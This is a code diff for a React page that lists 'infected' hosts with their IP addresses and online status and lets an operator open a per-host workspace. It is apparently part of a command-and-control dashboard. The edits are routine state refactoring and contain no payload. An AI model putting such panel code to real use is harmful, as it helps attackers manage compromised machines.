@@ -4,10 +4,11 @@ import type { Infected } from "../types/infected.ts";
 import api from "../api/baseUrl.ts";
 import { InfectedCard } from "../components/InfectedCard.tsx";
 import { useTitle } from "../hooks/useTitle.ts";
+import { useStore } from "../hooks/useStore.ts";
 
 export const InfectedPage: React.FC = () => {
     const navigate = useNavigate();
-    const [infected, setInfected] = useState<Infected[]>();
+    const { infected, setInfected } = useStore();
     useTitle("InfectedPage");
 
     /**
@@ -29,13 +30,12 @@ export const InfectedPage: React.FC = () => {
 
     const command = (infected: Infected) => {
         console.log(infected.latestIpAddress);
-        console.log(`/infectedWorkspace/${infected.iid}`)
-        //if (infected.online){
-            navigate(`/infectedWorkspace/${infected.iid}`)
-        //}
-        //else {
-        //    console.log(`Infected ${infected.iid} is offline!`);
-        //}
+        if (infected.online){
+            navigate(`/infected/${infected.iid}`)
+        }
+        else {
+            console.log(`Infected ${infected.iid} is offline!`);
+        }
     }
 
     /**
@@ -47,7 +47,7 @@ export const InfectedPage: React.FC = () => {
 
         sse.addEventListener("status.updated", (e) => {
             const data = JSON.parse(e.data);
-            setInfected(prev => prev?.map(infected => {
+            setInfected(infected.map(infected => {
                 if (infected.iid == data.iid) {
                     return {
                         ...infected,
